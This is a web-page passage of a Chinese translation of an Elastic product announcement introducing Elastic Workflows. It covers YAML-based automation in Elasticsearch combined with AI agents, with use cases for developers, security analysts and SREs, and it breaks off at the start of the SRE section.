<h1 class="article-title" data-v-61fb5e44="">
            ä»‹ç» Elastic Workflowsï¼šç”¨äº Elasticsearch çš„åŸç”Ÿè‡ªåŠ¨åŒ–
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2612095360441448/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Elasticsearch
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:08:38.000Z" title="Thu Feb 05 2026 10:08:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½œè€…ï¼šæ¥è‡ª ElasticÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fblog%2Fauthor%2Fsumana-mannem" title="https://www.elastic.co/blog/author/sumana-mannem" target="_blank" ref="nofollow noopener noreferrer">Sumana Mannem</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fblog%2Fauthor%2Fjames-spiteri" title="https://www.elastic.co/blog/author/james-spiteri" target="_blank" ref="nofollow noopener noreferrer">James Spiteri</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b5279027dfa741229bacec3c5a212edb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=ZH%2BOxWyxI2HICvyGhK4jBMY9QIM%3D" alt="" loading="lazy"/></p>
<p>åœ¨ Elasticsearch ä¸­åŸç”Ÿç»Ÿä¸€è„šæœ¬åŒ–è‡ªåŠ¨åŒ–å’Œ AI agentsã€‚æ¶ˆé™¤é›†æˆï¼Œç›´æ¥å¯¹ä½ çš„æ•°æ®é‡‡å–è¡ŒåŠ¨ã€‚</p>
<p>ä»Šå¤©ï¼Œæˆ‘ä»¬æ­£å¼æ¨å‡º Elastic Workflowsï¼Œè¿™æ˜¯ç›´æ¥å†…ç½®åœ¨ Elasticsearch ä¸­çš„è‡ªåŠ¨åŒ–å¼•æ“ã€‚Workflows ä¸ºç®€å•ä»»åŠ¡æä¾›å¯é çš„è„šæœ¬åŒ–è‡ªåŠ¨åŒ–ï¼Œå¹¶ä¸ºéœ€è¦æ¨ç†çš„å¤æ‚é—®é¢˜æä¾›ç”± AI é©±åŠ¨çš„è‡ªåŠ¨åŒ–ã€‚</p>
<p>Elastic Workflows ç°å·²ä»¥ æŠ€æœ¯é¢„è§ˆ å½¢å¼æä¾›ã€‚</p>
<h2 data-id="heading-0">æŒ‘æˆ˜ï¼šæ•°æ®å­¤å²›å’Œè¢«è¿«çš„æƒè¡¡</h2>
<p>ç»„ç»‡éœ€è¦è‡ªåŠ¨åŒ–æ¥è·Ÿä¸Šå½“ä»Šæ•°å­—ç¯å¢ƒçš„å¤æ‚æ€§ã€‚ä½†å¤§å¤šæ•°è‡ªåŠ¨åŒ–è§£å†³æ–¹æ¡ˆéƒ½å­˜åœ¨ä¸¤ä¸ªä¸»è¦é™åˆ¶ã€‚</p>
<ol>
<li><strong>è‡ªåŠ¨åŒ–é€šå¸¸ä¸è¿è¡Œæ•°æ®åˆ†ç¦»</strong>ã€‚è¿™æ„å‘³ç€å›¢é˜Ÿå¿…é¡»æ„å»ºå¹¶ç»´æŠ¤é›†æˆï¼Œæ‰èƒ½ä¸ºè‡ªåŠ¨åŒ–æä¾›æ‰€éœ€çš„ä¸Šä¸‹æ–‡ã€‚æ•°æ®å¿…é¡»åœ¨ç³»ç»Ÿä¹‹é—´å¯¼å‡ºã€åŒæ­¥æˆ–æŸ¥è¯¢ã€‚å‡­è¯éœ€è¦å•ç‹¬ç®¡ç†ã€‚å½“ä¸Šæ¸¸å‘ç”Ÿå˜åŒ–æ—¶ï¼Œé›†æˆå°±ä¼šä¸­æ–­ã€‚ç»´æŠ¤è¿™äº›é›†æˆä¼šå¢åŠ ä¸å¿…è¦çš„å·¥ä½œé‡ã€‚</li>
<li><strong>å›¢é˜Ÿè¿˜é¢ä¸´å¯é æ€§ä¸æ¨ç†èƒ½åŠ›ä¹‹é—´çš„æƒè¡¡</strong>ã€‚ä¼ ç»Ÿè‡ªåŠ¨åŒ–å¯ä»¥å¯é¢„æµ‹åœ°å¤„ç†å·²å®šä¹‰çš„ä»»åŠ¡ â€”â€” æ¯æ¬¡éƒ½ä»¥ç›¸åŒæ–¹å¼è¿è¡Œï¼Œè¿™æ­£æ˜¯æˆç†Ÿæµç¨‹æ‰€éœ€è¦çš„ã€‚ä½†å½“é‡åˆ°æ„å¤–æƒ…å†µæ—¶ï¼Œå®ƒæ— æ³•é€‚åº”ã€‚æ²¡æœ‰åˆ¤æ–­ï¼Œæ²¡æœ‰è§£é‡Šï¼Œåªæœ‰é¢„å®šä¹‰é€»è¾‘ã€‚</li>
</ol>
<p>ç”± AI é©±åŠ¨çš„å·¥å…·æ‰¿è¯ºå¡«è¡¥è¿™ä¸€ç©ºç™½ã€‚å®ƒä»¬å¯ä»¥åœ¨æ²¡æœ‰æ˜ç¡®æŒ‡ä»¤çš„æƒ…å†µä¸‹å¯¹æ¨¡ç³Šæƒ…å†µè¿›è¡Œæ¨ç†ã€æƒè¡¡é€‰é¡¹å¹¶å»ºè®®ä¸‹ä¸€æ­¥ã€‚ä½†å®ƒä»¬å¾€å¾€ç¼ºä¹å…³é”®ä¸šåŠ¡æµç¨‹æ‰€éœ€çš„ç²¾åº¦å’Œå¯é¢„æµ‹æ€§ã€‚è€Œä¸”å…¶ä¸­å¤§å¤šæ•°è·ç¦»ä½ çš„æ•°æ®æ›´è¿œï¼Œåˆå¢åŠ äº†ä¸€å±‚éœ€è¦ç®¡ç†çš„é›†æˆã€‚</p>
<p>ç›´åˆ°ç°åœ¨ï¼Œç»„ç»‡è¦ä¹ˆåœ¨è¿™äº›æ–¹æ³•ä¹‹é—´åšå‡ºé€‰æ‹©ï¼Œè¦ä¹ˆå°è¯•é€šè¿‡ä¸­é—´ä»¶å’Œè‡ªå®šä¹‰ä»£ç å°†å®ƒä»¬æ‹¼æ¥åœ¨ä¸€èµ·ã€‚Elastic Workflows é€šè¿‡åœ¨å•ä¸€ç³»ç»Ÿä¸­åŒæ—¶æä¾›è¿™ä¸¤ç§èƒ½åŠ›ï¼Œæ¶ˆé™¤äº†è¿™ç§é€‰æ‹©ã€‚</p>
<h2 data-id="heading-1">Elastic Workflowsï¼šæ•°æ®ã€ä¸Šä¸‹æ–‡å’Œè¡ŒåŠ¨ç»Ÿä¸€</h2>
<p>Elastic Workflows é€šè¿‡å°†è‡ªåŠ¨åŒ–å¼•æ“ç›´æ¥å¸¦åˆ°ä½ æ•°æ®æ‰€åœ¨çš„ä½ç½®æ¥è§£å†³è¿™äº›é—®é¢˜ã€‚æ— éœ€å¯¼å‡ºç®¡é“ã€æ— éœ€ä¸­é—´ä»¶ï¼Œä¹Ÿæ— éœ€ç®¡ç†å•ç‹¬çš„å®‰å…¨æ¨¡å‹ã€‚å½“å·¥ä½œæµéœ€è¦ä¸Šä¸‹æ–‡æ—¶ï¼Œå®ƒå·²ç»åœ¨é‚£é‡Œã€‚</p>
<p>å·¥ä½œæµä½¿ç”¨ YAML å®šä¹‰ï¼Œæ—¢è¶³å¤Ÿç®€å•ï¼Œä¾¿äºè¿›è¡Œç‰ˆæœ¬æ§åˆ¶å’Œå®¡æŸ¥ï¼Œåˆè¶³å¤Ÿæœ‰è¡¨ç°åŠ›ï¼Œèƒ½å¤Ÿå¤„ç†çœŸå®çš„è¿ç»´é€»è¾‘ã€‚å®ƒä»¬ç”±å†…ç½®å¼•æ“æ‰§è¡Œï¼Œè¯¥å¼•æ“ä¸ºä¼ä¸šçº§å¯é æ€§å’Œè§„æ¨¡è€Œè®¾è®¡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/28b43872a29b4c83b9e99186eabd8311~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=7pLBwlqfDLcftZUwj0shSX4U6Ks%3D" alt="" loading="lazy"/></p>
<p>å·¥ä½œæµæ˜¯å®Œå…¨å¯ç»„åˆä¸”äº‹ä»¶é©±åŠ¨çš„ã€‚å®ƒä»¬å¯ä»¥å“åº” Elasticsearch ä¸­æ•°æ®çš„å˜åŒ–ã€é€šè¿‡ webhook æ¥æ”¶æ¥è‡ªå¤–éƒ¨ system çš„äº‹ä»¶ï¼Œæˆ–å“åº”ç”±ç”¨æˆ·å‘èµ·çš„æ“ä½œã€‚ä½ å¯ä»¥å°†å·¥ä½œæµä¸²è”èµ·æ¥ã€è¿›è¡ŒåµŒå¥—ï¼Œæˆ–å°†å®ƒä»¬æš´éœ²ä¸ºå¯è¢«å…¶ä»– system è°ƒç”¨çš„ toolã€‚</p>
<p>åœ¨è¿è¡Œåï¼Œå·¥ä½œæµä¼šè¿æ¥åˆ°ä½ ç»„ç»‡å·²ç»ä½¿ç”¨çš„å¤–éƒ¨ systemï¼ŒåŒ…æ‹¬äº‘æä¾›å•†ã€æœåŠ¡å°ã€æ¶ˆæ¯å¹³å°å’Œèº«ä»½æä¾›å•†ã€‚ä½† Elasticsearch å§‹ç»ˆå¤„äºä¸­å¿ƒä½ç½®ï¼Œå› æ­¤å·¥ä½œæµä¸­çš„æ¯ä¸€æ­¥éƒ½å¯ä»¥è®¿é—®ä½ ç¯å¢ƒçš„å®Œæ•´ä¸Šä¸‹æ–‡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/553788a38541408a93276dbea4ebcb83~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=oHHiWA7B6H9%2B6ZC8YUBczI8c%2B%2F8%3D" alt="" loading="lazy"/></p>
<p>ç»“æœæ˜¯ä¸€ä¸ªæ›´ç®€å•çš„æ¶æ„ï¼Œå…·æœ‰æ›´å°‘çš„ç§»åŠ¨éƒ¨ä»¶ï¼Œå¹¶ä¸”æ‰§è¡Œæ›´å¿«ï¼Œå› ä¸ºè·å–åŸºç¡€ä¸Šä¸‹æ–‡æ—¶ä¸éœ€è¦å¾€è¿”å¤–éƒ¨ systemã€‚åŒæ—¶ï¼Œå¯å‡ºé—®é¢˜çš„åœ°æ–¹ä¹Ÿæ›´å°‘ï¼Œå› ä¸ºä½ ä¸å†ç»´æŠ¤ä¸€å¼ å¤æ‚çš„é›†æˆç½‘ç»œã€‚</p>
<h2 data-id="heading-2">ç”¨äºæ™ºèƒ½è‡ªåŠ¨åŒ–çš„ workflows å’Œ agents</h2>
<p>åœ¨ Elasticsearch ä¸Šå°†è‡ªåŠ¨åŒ–å’Œ AI ç»Ÿä¸€çš„æ¶æ„ï¼Œä½¿ä¸€ä»¶ä¸€ç›´å¾ˆéš¾å®ç°çš„äº‹æƒ…æˆä¸ºå¯èƒ½ï¼šåœ¨åŒä¸€ä¸ªæµç¨‹ä¸­ï¼Œå°†å¯é¢„æµ‹æ‰§è¡Œçš„å¯é æ€§ä¸ AI æ¨ç†çš„çµæ´»æ€§ç»“åˆèµ·æ¥ã€‚</p>
<p>å®ƒçš„å·¥ä½œæ–¹å¼æ˜¯è¿™æ ·çš„ã€‚workflow è´Ÿè´£å¤„ç†æµç¨‹ä¸­ç»“æ„åŒ–çš„éƒ¨åˆ† â€”â€” æ¯æ¬¡éƒ½åº”è¯¥ä»¥ç›¸åŒæ–¹å¼è¿è¡Œçš„æ­¥éª¤ã€‚å½“ workflow è¿è¡Œåˆ°éœ€è¦åˆ¤æ–­çš„èŠ‚ç‚¹æ—¶ï¼Œå®ƒå¯ä»¥è°ƒç”¨ä¸€ä¸ª AI agent æ¥åˆ†æå¯ç”¨çš„ä¸Šä¸‹æ–‡å¹¶å†³å®šä¸‹ä¸€æ­¥è¯¥æ€ä¹ˆåšã€‚agent åŸºäºæ•°æ®è¿›è¡Œæ¨ç†ï¼Œåšå‡ºå†³ç­–ï¼Œå¹¶è¿”å›ç»“æœã€‚ç„¶å workflow æ ¹æ®è¿™ä¸ªè¾“å…¥ç»§ç»­æ‰§è¡Œã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23f567a8799d4472a3f6de53f228e37b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=8xmin%2BdvkKAeD%2BBCJuRCBfjhczw%3D" alt="" loading="lazy"/></p>
<p><strong>è¿™ç§é›†æˆæ˜¯åŒå‘çš„</strong>ã€‚workflows å¯ä»¥åœ¨æ›´å¤§çš„æµç¨‹ä¸­æŠŠ agents ä½œä¸ºæ™ºèƒ½æ­¥éª¤æ¥è°ƒç”¨ã€‚è€Œ agents ä¹Ÿå¯ä»¥æŠŠ workflows å½“ä½œ tools æ¥è°ƒç”¨ï¼Œä»è€Œå…·å¤‡é‡‡å–å…·ä½“è¡ŒåŠ¨çš„èƒ½åŠ› â€”â€” ä¸åªæ˜¯ç”Ÿæˆæ–‡æœ¬ï¼Œè€Œæ˜¯çœŸæ­£åœ¨ä½ ç»„ç»‡è¿è¡Œçš„å„ä¸ª ç³»ç»Ÿ ä¸­æ‰§è¡Œæ“ä½œã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/679fcbed492b448badb8677b9297c824~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=T6vkc48i1PdbjJ7YAq1NRqpvaTA%3D" alt="" loading="lazy"/></p>
<p>Elastic Workflows é€šè¿‡ä¸ <a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F153720860" title="https://elasticstack.blog.csdn.net/article/details/153720860" target="_blank" ref="nofollow noopener noreferrer">Elastic Agent Builder</a> çš„é›†æˆè·å¾—å…¶ agentic èƒ½åŠ›ã€‚Agent Builder æ˜¯ Elasticsearch ä¸­ç”¨äºåˆ›å»ºè‡ªå®šä¹‰ AI agents çš„åŸç”Ÿèƒ½åŠ›ã€‚ä½¿ç”¨ Agent Builder æ„å»ºçš„ agents å¯ä»¥è®¿é—®ä¸ workflows ç›¸åŒçš„æ•°æ®å’Œä¸Šä¸‹æ–‡ï¼Œè¿™æ„å‘³ç€å®ƒä»¬å¯ä»¥åšå‡ºæ›´å¥½çš„å†³ç­–ã€‚å¹¶ä¸”ç”±äº workflows å’Œ agents éƒ½è¿è¡Œåœ¨åŒä¸€å¹³å°ä¸Šï¼Œæ¨ç†ä¸æ‰§è¡Œä¹‹é—´ä¸å­˜åœ¨é›†æˆæ–­å±‚ã€‚</p>
<p>ä¸æ ‡å‡† AI å·¥å…·é€šå¸¸åªç”Ÿæˆå»ºè®®ä¸åŒï¼ŒElastic Workflows ä½¿ agents èƒ½å¤Ÿé‡‡å–è¡ŒåŠ¨ï¼Œä¾‹å¦‚é‡å¯æœåŠ¡ã€æ›´æ–°è®°å½•ã€å‘é€é€šçŸ¥æˆ–è§¦å‘å¦ä¸€ä¸ª workflowã€‚</p>
<h2 data-id="heading-3">ä¸ºæ„å»º agents çš„å¼€å‘è€…</h2>
<p>AI çš„è¿›æ­¥ä½¿å¼€å‘è€…èƒ½å¤Ÿæ„å»ºæ¯”ä»¥å‰å¼ºå¤§å¾—å¤šçš„ agentsï¼Œä»è€Œè‡ªåŠ¨åŒ–æ›´å¤šä»»åŠ¡ã€‚agents ä¸å†åªæ˜¯ç”¨äºèŠå¤©ï¼›å®ƒä»¬ç°åœ¨å¯ä»¥è‡ªè¡Œåšå‡ºå†³ç­–å¹¶é‡‡å–è¡ŒåŠ¨ã€‚ç„¶è€Œï¼Œè®¸å¤š agent æ„å»ºæ¡†æ¶è¦æ±‚å¤§è¯­è¨€æ¨¡å‹ï¼ˆ LLMs ï¼‰è§„åˆ’å’Œç®¡ç†è‡ªåŠ¨åŒ–çš„æ¯ä¸€ä¸ªæ­¥éª¤ã€‚è™½ç„¶ AI æ“…é•¿æ¨ç†ï¼Œä½†å®ƒç¼ºä¹ä¸šåŠ¡é€šå¸¸éœ€è¦çš„ã€å·²å®šä¹‰åŠ¨ä½œæ‰€å…·å¤‡çš„å¯é æ€§ã€‚</p>
<p>Workflows å¯ä»¥é€šè¿‡ MCP ä½œä¸º tools æä¾›ç»™ agentï¼Œä»è€Œå¼¥è¡¥è¿™ä¸€å·®è·ã€‚Workflows æ˜¯ agents çš„ â€œæ‰‹â€ï¼Œè®© agents èƒ½å¤Ÿä»¥å¯é çš„æ–¹å¼ä¸ å„ç§ç³»ç»Ÿ äº¤äº’ï¼Œæ‰§è¡Œæ“ä½œå¹¶æ”¶é›†ä¿¡æ¯ã€‚</p>
<p>Workflows å¸®åŠ©å¼€å‘è€…å°†å¤æ‚æµç¨‹è½¬åŒ–ä¸ºå¯é¢„æµ‹ã€å¯å¤ç”¨çš„ toolsï¼Œç”¨äºä¿¡æ¯æ”¶é›†å’Œæ‰§è¡Œæ“ä½œã€‚ä¾‹å¦‚ï¼Œæ„å»º agent åº”ç”¨é€šå¸¸éœ€è¦é€šè¿‡è¿è¡Œç¬¦åˆå…¬å¸æ ‡å‡†çš„å†…éƒ¨å’Œå¤–éƒ¨ç³»ç»Ÿæµç¨‹æ¥è·å–ä¿¡æ¯ã€‚Workflows é€šè¿‡å°†å¤æ‚æµç¨‹è½¬åŒ–ä¸ºå¯é¢„æµ‹ã€å¯å¤ç”¨çš„åŠ¨ä½œæ¥è§£å†³è¿™ä¸€é—®é¢˜ï¼Œä¾‹å¦‚é›†æˆä¼ä¸šæ•°æ®ã€è°ƒç”¨æœåŠ¡ã€å…³è”ä¿¡å·ä»¥åŠæ›´æ–°è®°å½•ã€‚è¿™ç®€åŒ–äº†å¤šç§æœç´¢å’Œè‡ªåŠ¨åŒ–ä»»åŠ¡ï¼Œå¦‚å®¢æˆ·æ”¯æŒåˆ†æµã€å†…å®¹ä¸Šä¼ å’Œä¸šåŠ¡é€»è¾‘è‡ªåŠ¨åŒ–ã€‚å®ƒä½¿åŸºäº Elasticsearch æ„å»ºçš„åº”ç”¨èƒ½å¤Ÿæ™ºèƒ½åœ°å“åº”ä¸æ¸…æ™°çš„è¯·æ±‚ï¼ŒåŒæ—¶ç”± Workflows æä¾›æ”¯æ’‘è¿™äº›å†³ç­–æ‰€éœ€çš„å¯é æ‰§è¡Œèƒ½åŠ›ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2f716cd7181437abebcbd3ce5c39d8a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=sjNzSSgKoOT907LRhDFA0isca%2BE%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">ä¸ºå®‰å…¨åˆ†æå¸ˆ</h2>
<p>å®‰å…¨åˆ†æå¸ˆéœ€è¦å¤„ç†æºæºä¸æ–­çš„å‘Šè­¦ï¼Œè€Œå¤§é‡åˆå§‹åˆ†æµå·¥ä½œéƒ½éµå¾ªå¯é¢„æµ‹çš„æ¨¡å¼ï¼šä¸ºå‘Šè­¦è¡¥å……ä¸Šä¸‹æ–‡ã€æ£€æŸ¥ç›¸å…³æ´»åŠ¨ã€æ‹‰å–èµ„äº§å’Œèº«ä»½ä¿¡æ¯ã€æ›´æ–°æ¡ˆä»¶ï¼Œå¹¶é€šçŸ¥åˆé€‚çš„äººå‘˜ã€‚è¿™æ­£æ˜¯è‡ªåŠ¨åŒ–åº”è¯¥å¤„ç†çš„å·¥ä½œç±»å‹ã€‚</p>
<p>Workflows è®©å®‰å…¨å›¢é˜Ÿèƒ½å¤Ÿä»¥å®Œå…¨çš„æ§åˆ¶åŠ›å’Œå¯é¢„æµ‹æ€§å°†è¿™äº›æµç¨‹ç¼–ç åŒ–ã€‚å¸¸è§„æ­¥éª¤å§‹ç»ˆä¼šè‡ªåŠ¨ä¸”ä¸€è‡´åœ°æ‰§è¡Œã€‚</p>
<p>ä½†è°ƒæŸ¥å¹¶ä¸æ€»æ˜¯å¸¸è§„çš„ã€‚æœ‰æ—¶å‘Šè­¦ä¸ç¬¦åˆä»»ä½•å·²çŸ¥æ¨¡å¼ã€‚æœ‰æ—¶æ”»å‡»è€…é‡‡ç”¨äº†æ–°çš„æ‰‹æ³•ã€‚åœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œåˆ†æå¸ˆé€šå¸¸éœ€è¦ä»é›¶å¼€å§‹ï¼Œæ‰‹åŠ¨æ”¶é›†æ—¥å¿—ã€è¿½è¸ªç”¨æˆ·è¡Œä¸ºã€åœ¨å¤šä¸ªç³»ç»Ÿä¹‹é—´å…³è”ä¿¡å·ï¼Œå¹¶å½¢æˆå¯¹äº‹ä»¶ç»è¿‡çš„å‡è®¾ã€‚</p>
<p>è¿™æ­£æ˜¯ workflows ä¸ agents ç»“åˆæ”¹å˜å±€é¢çš„åœ°æ–¹ã€‚åˆ†æå¸ˆä¸å†ä»ä¸€å¼ ç©ºç™½å±å¹•å¼€å§‹ï¼Œè€Œæ˜¯ç”± agent å…ˆå®Œæˆæ—©æœŸå‡†å¤‡å·¥ä½œï¼šå®¡æŸ¥è¯æ®ã€è¯†åˆ«å¼‚å¸¸æ¨¡å¼ã€æ£€æŸ¥é¢„æœŸçš„æ§åˆ¶æ˜¯å¦åˆ°ä½ï¼Œå¹¶å»ºè®®å“ªäº›çº¿ç´¢å€¼å¾—ç»§ç»­æ·±å…¥ã€‚workflow ä¿æŒæ•´ä½“æµç¨‹çš„ç»“æ„åŒ–å’Œå¯å®¡è®¡æ€§ï¼Œè€Œ agent è´Ÿè´£å¤„ç†ä¸ç¡®å®šæ€§ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e35d61821e443e2ac7e032f1aebcf46~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=rxX1ohxTdc14E4sO2DeG5T63AtE%3D" alt="" loading="lazy"/></p>
<p>åˆ†æå¸ˆä»ç„¶ä¿æŒæ§åˆ¶æƒï¼Œä½†èµ·ç‚¹æ›´é«˜ â€”â€” å·²ç»ç»„è£…å¥½ä¸Šä¸‹æ–‡ï¼Œå¹¶ä¸”æœ‰å¯ä¾›è¯„ä¼°çš„åˆå§‹å‡è®¾ï¼Œè€Œä¸æ˜¯ä»é›¶å¼€å§‹æ„å»ºã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/290f4a5525d44d48a791a0ae2676e0ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890918&amp;x-signature=WDHESwlh8PdMDErBlZwyN%2FDAA88%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-5">å¯¹äº SREs</h2>
<p>è¿ç»´å›¢é˜Ÿå¤§é‡è‡ªåŠ¨åŒ–ï¼šå¥åº·æ£€æŸ¥ã€å®¹é‡å†³ç­–ã€å‘Šè­¦è·¯ç”±å’Œä¿®å¤æ‰‹å†Œã€‚è¿™äº›æµç¨‹åœ¨å·²çŸ¥æ¨¡å¼ä¸‹ä¿æŒæœåŠ¡å¹³ç¨³è¿è¡Œã€‚</p>
